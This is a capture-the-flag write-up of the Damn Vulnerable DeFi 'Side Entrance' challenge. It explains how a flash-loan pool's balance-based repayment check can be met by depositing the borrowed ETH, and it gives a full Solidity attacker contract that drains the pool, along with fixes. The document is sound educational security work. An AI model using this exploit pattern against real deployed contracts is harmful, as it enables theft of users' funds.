# Side Entrance — Repaying a Flash Loan With a Deposit

**Challenge:** Damn Vulnerable DeFi v4 — Side Entrance
**Category:** Broken Invariant / Flash Loan Repayment Bypass
**Severity:** Critical (every ETH in the pool is stolen, by anyone, with no capital)

## What's going on

A pool holds 1000 ETH. Users can deposit ETH and withdraw it later, and the pool also
offers free flash loans of ETH. You start with 1 ETH and have to move all 1000 ETH to a
recovery account.

The pool has no admin and no obvious way to take other people's money. The bug is that
its two features share the same pot of ETH, and neither one knows about the other.

## The bug

The flash loan decides whether it was repaid by comparing the pool's raw ETH balance
before and after:

```solidity
uint256 balanceBefore = address(this).balance;
IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
if (address(this).balance < balanceBefore) revert RepayFailed();
```

`deposit()` also raises the pool's balance, and it credits the depositor in `balances`:

```solidity
function deposit() external payable {
    balances[msg.sender] += msg.value;
}
```

So the borrower can "repay" the loan by depositing the borrowed ETH back into the pool.
The balance check sees the money returned and passes. But the pool now records that ETH
as the borrower's own deposit, which `withdraw()` will pay out.

The loan was never really repaid. It was converted into a withdrawable claim, and a
check that only reads the balance cannot tell the difference.

## The attack

1. Deploy an attacker contract that implements `execute()`, the callback the pool calls.
2. Call `pool.flashLoan(1000 ether)`. The pool sends 1000 ETH to the attacker's `execute()`.
3. Inside `execute()`, call `pool.deposit{value: msg.value}()`. The pool's balance is
   restored and the attacker is credited 1000 ETH.
4. The loan returns and the balance check passes.
5. The attacker calls `pool.withdraw()` and receives 1000 ETH, then forwards it to the
   recovery account.

## PoC

```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceAttacker attacker = new SideEntranceAttacker(pool, recovery);
    attacker.attack();
}

contract SideEntranceAttacker {
    SideEntranceLenderPool public immutable pool;
    address public immutable recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool ok,) = recovery.call{value: address(this).balance}("");
        require(ok, "forward failed");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

Full test file: `test/side-entrance/SideEntrance.t.sol`

## Why I'm calling this Critical

- **Total loss of funds.** The attacker takes 100% of the pool, and the depositors are
  left with a balance the pool cannot pay.
- **No capital required.** The flash loan is free, so the attacker needs only gas.
- **No privileges and no timing window.** Any address can do it, in one transaction.
- **The invariant is broken at the design level.** Each feature is correct on its own,
  but together they let a borrower turn a loan into ownership of the funds.

## Fix

- Add a reentrancy guard shared by `deposit`, `withdraw` and `flashLoan`, so `deposit`
  cannot be called while a loan is in progress.
- Or require repayment through a dedicated function that does not credit user balances,
  and track loans explicitly instead of inferring repayment from `address(this).balance`.
- More generally, keep user accounting and flash loan accounting separate so one
  cannot satisfy the other.

## Takeaway

A check that reads a shared balance is only as strong as every path that can change that
balance. When a contract has a flash loan next to anything that also increases its
balance (deposit, mint, stake, donate), ask whether the borrower can satisfy the
"repaid" check through that second path. The same pattern shows up wherever a contract
mixes a temporary obligation with a permanent claim on the same funds.
